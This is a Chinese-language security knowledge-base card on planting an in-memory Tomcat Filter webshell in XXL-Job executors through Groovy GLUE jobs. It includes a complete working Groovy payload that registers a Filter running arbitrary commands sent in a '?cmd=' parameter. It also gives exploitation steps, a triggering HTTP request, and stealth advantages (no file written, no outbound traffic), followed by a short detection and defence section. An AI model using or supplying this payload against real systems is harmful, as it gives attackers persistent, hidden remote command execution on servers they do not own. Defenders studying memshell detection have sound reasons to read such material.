---
id: web-java-component-xxl-job-executor-tomcat-filter-memshell-threadgroup
title: XXL-Job Executor 2.3.0（Tomcat 9）GLUE 任务注入 Filter 内存马：遍历线程组取 TomcatEmbeddedContext 后动态注册 filter
type: scenario
domain: web
path: web/java/component
technique: xxl-job-glue-tomcat-filter-memshell
aliases:
- xxl-job filter 内存马
- xxl-job-executor 内存马
- TomcatEmbeddedContext 获取
- 线程组遍历 StandardContext
- GLUE 任务注入内存马
- xxl-job 端点分离内存马
tags:
- java
- xxl-job
- tomcat
- memshell
- filter
- glue
- groovy
- post-exploitation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
affected_versions: 2.3.0（Tomcat 9，实测环境；其他版本未测试）
verification:
  verified_by: verifier-V577
  verified_at: '2026-11-12T11:23:45+08:00'
  notes: 已对照原文与7张图核对：适用情况明确写『本地搭建环境为xxl-job-2.3.0（tomcat9），其他版本尚未测试』，2.3.0为原文明确的测试环境版本，affected_versions按原文标注并带『其他版本未测试』限定，符合库内『原文复现/验证版本』惯例，非猜测，保留。图01-03为java-object-searcher检索Request与processors空/无效(serverPort=-1,serverNameMB=null)；图04为Thread->TomcatWebServer->this/usr/bin/bash->tomcat->server->services->engine->children[localhost]->children['']=TomcatEmbeddedContext->filterConfigs；图05为Groovy数组字面量unexpected token报错；图06日志success! memshell port:8081；图07 Burp GET /aaa?cmd=回显xxl-job-executor，与卡片PoC一致。修正：原理中Filter注册步骤顺序按原文代码改为先addFilterDef、再构造ApplicationFilterConfig放入filterConfigs、最后addFilterMapBefore。原文依赖GLUE任务创建/触发权限（非独立未授权漏洞），卡片已写明触发条件。dedup最近候选tomcat-dynamic-filter-memshell(cos0.9048,通用注册流程)与xxl-job Jetty HandlerCollection内存马(1.9.2/Jetty不同容器注入点)均非同链，按库内内存马变体分卡惯例设立；dup-scan未涉及。verified。
---

## 一句话结论

拿到 xxl-job 执行端的 GLUE（Groovy）任务创建/执行能力后，可在任务代码里遍历 `Thread.currentThread().getThreadGroup().getThreads()`，从 `container` 线程的 `this$0` 一路反射到 `TomcatEmbeddedContext`（即 `StandardContext`），再把自定义 `FilterDef`/`FilterMap` 与 `ApplicationFilterConfig` 注入 `filterConfigs` 并 `addFilterMapBefore`，在 executor 的 `server.port` 内嵌 Tomcat 上留下 `?cmd=` 触发的 Filter 内存马；无需落文件、不出网，也适用于 admin 与 executor 分处不同主机的场景。

## 原理

- **GLUE 任务在 executor JVM 内执行**：xxl-job 执行端的 GLUE 模式会编译并运行 Groovy 脚本，脚本拥有应用类加载器与反射能力；只要能创建/触发 GLUE 任务（后台权限、数据库写入 cron 任务等），就相当于在 executor 进程内获得代码执行。
- **executor 双端口**：`xxl.job.executor.port`（示例 9999）是 Netty RPC 服务，`server.port`（示例 8081）是 Spring Boot 内嵌 Tomcat（访问返回 Whitelabel Error Page）。内存马要挂在 Tomcat 上，因此目标是 8081 的 `StandardContext`。
- **通用 Tomcat 内存马取 Context 的链在嵌入式环境失效**：常见 payload 从 `org.apache.coyote.Request` 经 `RequestGroupInfo.processors` 找 `RequestInfo` 再回溯容器；但 xxl-job executor 的 8081 端口若从未被访问，`processors` 为空，即使访问后 `serverPort=-1`、`serverNameMB=null`，拿不到有效的请求上下文。
- **线程组遍历绕过**：Tomcat 的容器线程名包含 `container`，其 `this$0` 是 `TomcatWebServer$1`，继续反射 `tomcat → server → services → engine`；`StandardEngine` 父类的 `children` 是 `HashMap<String, Container>`，取 `localhost`（StandardHost）再取其父类 `children` 的 `""` 键，即 `TomcatEmbeddedContext`（`StandardContext` 子类）。`http-nio-<port>-ClientPoller` 线程名可直接解析出 web 端口。
- **Filter 注册三件套**：创建 `FilterDef`（含恶意 Filter 实例）、`FilterMap`（`/*`、DispatcherType.REQUEST），先 `StandardContext.addFilterDef`，再反射调用 `ApplicationFilterConfig(Context, FilterDef)` 构造器并把 config 放进 `StandardContext` 父类的 `filterConfigs` Map，最后 `addFilterMapBefore` 使过滤链最前面执行恶意 Filter。
- **隐蔽性与适用性**：内存马只存在于 JVM 内存，无文件落地、不依赖出网；admin 与 executor 分离时 vagent 等同主机注入不适用，本方法直接在 executor 本地完成；Filter 对所有请求生效，用 `?cmd=` 参数触发命令执行。
- **Groovy 语法坑**：xxl-job 的 Groovy 对 Java 语法并非完全兼容，`new String[]{"cmd.exe","/c",...}` 这类数组字面量会报 `unexpected token`，需改用 `ArrayList`；内部类中的 `this$0` 需要转义。

## 触发条件

- 目标为 xxl-job 2.3.0（内嵌 Tomcat 9；其他版本未测试）执行端，`server.port` 的 Tomcat 端口可从攻击者访问（用于连接内存马）。
- 攻击者已具备创建/触发 GLUE 任务的权限或入口（如 xxl-job-admin 后台、数据库写入 `xxl_job_info` 的 cron/GLUE 任务等）。
- executor 进程未禁用 Groovy GLUE 或未限制任务源码；内存马过滤链未被安全组件监控。
- 不需要 admin 与 executor 同主机，也不需要目标出网。

## 利用步骤

1. 确认 executor 配置：`server.port`（Tomcat Web）与 `xxl.job.executor.port`（Netty RPC）分别是多少；访问 `server.port` 确认是 Tomcat（Whitelabel Error Page）。
2. 在 xxl-job-admin 创建 GLUE（Groovy）任务，或通过已有 RCE/数据库写入向 `xxl_job_info` 插入 GLUE 任务并触发。
3. 将 Filter 内存马 EXP 作为 GLUE 脚本内容执行：遍历线程组取 `TomcatEmbeddedContext`，注册 FilterDef/FilterMap/ApplicationFilterConfig。
4. 查看任务执行日志，成功时输出 `success! memshell port:<port>`。
5. 访问 `http://executor:<server.port>/任意路径?cmd=whoami`，Filter 执行命令并回显，验证内存马。
6. 后续可通过同一 Filter 执行任意命令；重启进程后内存马消失，需要重新注入或配合其他持久化。

## PoC

最小化 EXP（Groovy，按文章结构精简；完整版见原文）：

```groovy
import javax.servlet.*
import javax.servlet.http.*
import org.apache.catalina.Context
import org.apache.catalina.core.*
import org.apache.tomcat.util.descriptor.web.*
import java.lang.reflect.*

Filter filter = new Filter() {
    void init(FilterConfig c) {}
    void doFilter(ServletRequest rq, ServletResponse rs, FilterChain ch) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) rq
        HttpServletResponse resp = (HttpServletResponse) rs
        if (req.getParameter("cmd") != null) {
            ArrayList<String> l = new ArrayList<>()
            String os = System.getProperty("os.name")
            if (os.toLowerCase().contains("win")) { l.add("cmd.exe"); l.add("/c") } else { l.add("/bin/bash"); l.add("-c") }
            l.add(req.getParameter("cmd"))
            Process p = new ProcessBuilder(l.toArray(new String[0])).start()
            resp.getWriter().println(p.getInputStream().getText())
            return
        }
        ch.doFilter(rq, rs)
    }
    void destroy() {}
}

FilterDef fd = new FilterDef()
fd.setFilter(filter); fd.setFilterName("xxl-job-filter"); fd.setFilterClass(filter.getClass().getName())
FilterMap fm = new FilterMap()
fm.addURLPattern("/*"); fm.setFilterName("xxl-job-filter"); fm.setDispatcher(DispatcherType.REQUEST.name())

// 反射取 StandardContext（TomcatEmbeddedContext）
Object obj = null; String port = ""
Thread t = Thread.currentThread()
Field gf = Thread.class.getDeclaredField("group"); gf.setAccessible(true)
ThreadGroup g = (ThreadGroup) gf.get(t)
Field tf = ThreadGroup.class.getDeclaredField("threads"); tf.setAccessible(true)
for (Thread th : (Thread[]) tf.get(g)) {
    if (th.getName().contains("container")) obj = getField(th, "this\$0")
    if (th.getName().contains("http-nio-") && th.getName().contains("-ClientPoller"))
        port = th.getName().substring(9, th.getName().length() - 13)
}
obj = getField(obj, "tomcat"); obj = getField(obj, "server")
for (org.apache.catalina.Service s : (org.apache.catalina.Service[]) getField(obj, "services")) {
    obj = getField(s, "engine")
    HashMap children = (HashMap) getSuperClassField(obj, "children")
    obj = children.get("localhost")
    children = (HashMap) getSuperClassField(obj, "children")
    StandardContext ctx = (StandardContext) children.get("")
    ctx.addFilterDef(fd)
    Map fc = (Map) getSuperClassField(ctx, "filterConfigs")
    Constructor c = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class)
    c.setAccessible(true)
    fc.put("xxl-job-filter", c.newInstance(ctx, fd))
    ctx.addFilterMapBefore(fm)
}
```

```http
GET /aaa?cmd=echo%20xxl-job-executor HTTP/1.1
Host: 127.0.0.1:8081

HTTP/1.1 200
xxl-job-executor
```

- `getField`/`getSuperClassField` 为文章中的反射辅助函数（先 `getDeclaredField` 再 `setAccessible(true)`，找不到时取父类字段）。
- Groovy 中不要用 `new String[]{...}` 数组字面量（会编译失败），用 `ArrayList`；`this$0` 需转义。

## 变体与关联

- **xxl-job Jetty 内存马**：`web-java-component-xxl-job-executor-jetty-handler-collection-memshell`（1.9.2 瘦身版 Jetty）通过线程栈取 `JettyServer` 的 `HandlerCollection` 注入 Handler；本卡针对 Tomcat 9 的 `StandardContext` + Filter，容器与注入点不同。
- **通用 Tomcat Filter 内存马**：`web-java-component-tomcat-dynamic-filter-memshell` 覆盖 `addFilterDef/addFilterMapBefore/filterStart` 的标准注册流程；本卡的新增点是嵌入式 Tomcat 下通过线程组遍历获取 `TomcatEmbeddedContext` 的定位链，以及通过 xxl-job GLUE 任务执行。
- **入口链**：`web-java-component-xxl-job-db-insert-cron-job-rce` 展示向 `xxl_job_info` 写入恶意 CRON/GLUE 任务触发 executor 执行，可作为本卡的投递方式。
- **其他嵌入式 Tomcat 应用**：Spring Boot 应用同样存在 `TomcatWebServer`/`TomcatEmbeddedContext`，该线程组遍历思路可迁移；Netty RPC 端口（executor.port）的内存马是另一条研究路线。

## 检测与防御

- **升级与权限收敛**：升级 xxl-job 并限制 admin 访问；非必要不开放 GLUE 模式，GLUE 任务创建/执行仅限可信管理员，审计任务源码与变更。
- **内存马排查**：用 java-memshell-scanner/Arthas 检查 `StandardContext.filterConfigs` 是否出现非基线 Filter（如名字可疑、`doFilter` 含 `ProcessBuilder`/`Runtime`）；关注 `filterDefs`/`filterMaps` 数量变化与 `addFilterMapBefore` 调用。
- **线程与反射行为**：监控 executor JVM 中 Groovy 脚本对 `ThreadGroup.threads`、`TomcatWebServer`、`StandardContext` 的反射访问（RASP/字节码增强规则）。GLUE 任务日志中出现 `success! memshell port:` 等异常输出应立即告警。
- **网络侧**：限制对 executor `server.port` 的直接访问，只允许必要来源；对 `?cmd=` 等参数与异常命令回显做检测。
- **应急**：重启 executor 进程可清除内存马，但需先修复 GLUE 投递入口（admin 弱口令/未授权/数据库写入），否则会再次被注入。
